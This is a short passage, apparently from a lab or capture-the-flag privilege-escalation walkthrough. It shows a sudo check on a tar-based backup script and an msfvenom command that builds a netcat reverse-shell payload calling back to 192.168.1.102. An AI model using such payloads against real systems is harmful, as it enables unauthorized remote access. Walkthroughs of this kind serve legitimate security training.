Ok, I checked what we can sudo: sudo -l
We can sudo as another user script in /opt/backups/backup.sh. This script is running tar cf /opt/backups/backup.tar

This script is taking a backup.tar of everything in backup directory. We create msfvenom 
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R
